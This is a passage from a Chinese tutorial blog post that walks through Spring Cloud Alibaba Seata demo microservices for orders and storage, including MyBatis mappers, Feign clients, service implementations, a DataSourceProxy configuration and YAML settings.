class="attr">jdbcType</span>=<span class="string">"INTEGER"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"create"</span>&gt;</span></span><br><span class="line">        insert into t_order (id,user_id,product_id,count,money,status)</span><br><span class="line">        values (null,#&#123;userId&#125;,#&#123;productId&#125;,#&#123;count&#125;,#&#123;money&#125;,0);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"update"</span>&gt;</span></span><br><span class="line">        update t_order set status = 1</span><br><span class="line">        where user_id=#&#123;userId&#125; and status = #&#123;status&#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Service接口及实现</p><ul><li>OrderService<ul><li>OrderServiceImpl</li></ul></li><li>StorageService</li><li>AccountService</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.domain.Order;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrderService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(Order order)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.domain.CommonResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.FeignClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FeignClient</span>(value = <span class="string">"seata-storage-service"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StorageService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping</span>(value = <span class="string">"/storage/decrease"</span>)</span><br><span class="line">    <span class="function">CommonResult <span class="title">decrease</span><span class="params">(@RequestParam(<span class="string">"productId"</span>)</span> Long productId, @<span class="title">RequestParam</span><span class="params">(<span class="string">"count"</span>)</span> Integer count)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.domain.CommonResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.FeignClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FeignClient</span>(value = <span class="string">"seata-account-service"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@PostMapping</span>(value = <span class="string">"/account/decrease"</span>)</span><br><span class="line">    <span class="function">CommonResult <span class="title">decrease</span><span class="params">(@RequestParam(<span class="string">"userId"</span>)</span> Long userId, @<span class="title">RequestParam</span><span class="params">(<span class="string">"money"</span>)</span> BigDecimal money)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.dao.OrderDao;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.domain.Order;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.service.AccountService;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.service.OrderService;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.service.StorageService;</span><br><span class="line"><span class="keyword">import</span> io.seata.spring.annotation.GlobalTransactional;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderServiceImpl</span> <span class="keyword">implements</span> <span class="title">OrderService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> OrderDao orderDao;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> StorageService storageService;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> AccountService accountService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建订单-&gt;调用库存服务扣减库存-&gt;调用账户服务扣减账户余额-&gt;修改订单状态</span></span><br><span class="line"><span class="comment">     * 简单说：下订单-&gt;扣库存-&gt;减余额-&gt;改状态</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//@GlobalTransactional(name = "fsp-create-order",rollbackFor = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">create</span><span class="params">(Order order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        log.info(<span class="string">"-----&gt;开始新建订单"</span>);</span><br><span class="line">        <span class="comment">//1 新建订单</span></span><br><span class="line">        orderDao.create(order);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2 扣减库存</span></span><br><span class="line">        log.info(<span class="string">"-----&gt;订单微服务开始调用库存，做扣减Count"</span>);</span><br><span class="line">        storageService.decrease(order.getProductId(),order.getCount());</span><br><span class="line">        log.info(<span class="string">"-----&gt;订单微服务开始调用库存，做扣减end"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3 扣减账户</span></span><br><span class="line">        log.info(<span class="string">"-----&gt;订单微服务开始调用账户，做扣减Money"</span>);</span><br><span class="line">        accountService.decrease(order.getUserId(),order.getMoney());</span><br><span class="line">        log.info(<span class="string">"-----&gt;订单微服务开始调用账户，做扣减end"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4 修改订单状态，从零到1,1代表已经完成</span></span><br><span class="line">        log.info(<span class="string">"-----&gt;修改订单状态开始"</span>);</span><br><span class="line">        orderDao.update(order.getUserId(),<span class="number">0</span>);</span><br><span class="line">        log.info(<span class="string">"-----&gt;修改订单状态结束"</span>);</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">"-----&gt;下订单结束了，O(∩_∩)O哈哈~"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.domain.CommonResult;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.domain.Order;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.service.OrderService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> OrderService orderService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/order/create"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">create</span><span class="params">(Order order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        orderService.create(order);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CommonResult(<span class="number">200</span>,<span class="string">"订单创建成功"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Config配置</p><ul><li>MyBatisConfig</li><li>DataSourceProxyConfig</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@MapperScan</span>(&#123;<span class="string">"com.atguigu.springcloud.alibaba.dao"</span>&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisConfig</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.datasource.DataSourceProxy;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.SqlSessionFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.transaction.SpringManagedTransactionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.support.PathMatchingResourcePatternResolver;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用Seata对数据源进行代理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataSourceProxyConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;mybatis.mapperLocations&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String mapperLocations;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.datasource"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSource <span class="title">druidDataSource</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DruidDataSource();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DataSourceProxy <span class="title">dataSourceProxy</span><span class="params">(DataSource dataSource)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> DataSourceProxy(dataSource);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SqlSessionFactory <span class="title">sqlSessionFactoryBean</span><span class="params">(DataSourceProxy dataSourceProxy)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SqlSessionFactoryBean sqlSessionFactoryBean = <span class="keyword">new</span> SqlSessionFactoryBean();</span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSourceProxy);</span><br><span class="line">        sqlSessionFactoryBean.setMapperLocations(<span class="keyword">new</span> PathMatchingResourcePatternResolver().getResources(mapperLocations));</span><br><span class="line">        sqlSessionFactoryBean.setTransactionFactory(<span class="keyword">new</span> SpringManagedTransactionFactory());</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;</span><br><span class="line"></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="comment">//取消数据源的自动创建，而是使用自己定义的</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span>(exclude = DataSourceAutoConfiguration<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">SeataOrderMainApp2001</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        SpringApplication.run(SeataOrderMainApp2001<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Seata之Storage-Module说明"><a href="#Seata之Storage-Module说明" class="headerlink" title="Seata之Storage-Module说明"></a>Seata之Storage-Module说明</h2><p>与seata-order-service2001模块大致相同</p><p>seata- storage - service2002</p><p>POM（与seata-order-service2001模块大致相同）</p><p>YML</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">2002</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">seata-storage-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">alibaba:</span></span><br><span class="line">      <span class="attr">seata:</span></span><br><span class="line">        <span class="attr">tx-service-group:</span> <span class="string">fsp_tx_group</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/seata_storage</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">io:</span></span><br><span class="line">      <span class="attr">seata:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapperLocations:</span> <span class="string">classpath:mapper/*.xml</span></span><br></pre></td></tr></table></figure><p>file.conf（与seata-order-service2001模块大致相同）</p><p>registry.conf（与seata-order-service2001模块大致相同）</p><p>domain</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Storage</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 产品id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Long productId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 总库存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer total;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 已用库存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 剩余库存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer residue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CommonResult（与seata-order-service2001模块大致相同）</p><p>Dao接口及实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Param;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StorageDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//扣减库存</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">decrease</span><span class="params">(@Param(<span class="string">"productId"</span>)</span> Long productId, @<span class="title">Param</span><span class="params">(<span class="string">"count"</span>)</span> Integer count)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="meta-string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.atguigu.springcloud.alibaba.dao.StorageDao"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"BaseResultMap"</span> <span class="attr">type</span>=<span class="string">"com.atguigu.springcloud.alibaba.domain.Storage"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">jdbcType</span>=<span class="string">"BIGINT"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"product_id"</span> <span class="attr">property</span>=<span class="string">"productId"</span> <span class="attr">jdbcType</span>=<span class="string">"BIGINT"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"total"</span> <span class="attr">property</span>=<span class="string">"total"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"used"</span> <span class="attr">property</span>=<span class="string">"used"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"residue"</span> <span class="attr">property</span>=<span class="string">"residue"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"decrease"</span>&gt;</span></span><br><span class="line">        UPDATE</span><br><span class="line">            t_storage</span><br><span class="line">        SET</span><br><span class="line">            used = used + #&#123;count&#125;,residue = residue - #&#123;count&#125;</span><br><span class="line">        WHERE</span><br><span class="line">            product_id = #&#123;productId&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Service接口及实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StorageService</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扣减库存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">decrease</span><span class="params">(Long productId, Integer count)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.dao.StorageDao;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.service.StorageService ;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StorageServiceImpl</span> <span class="keyword">implements</span> <span class="title">StorageService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(StorageServiceImpl<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> StorageDao 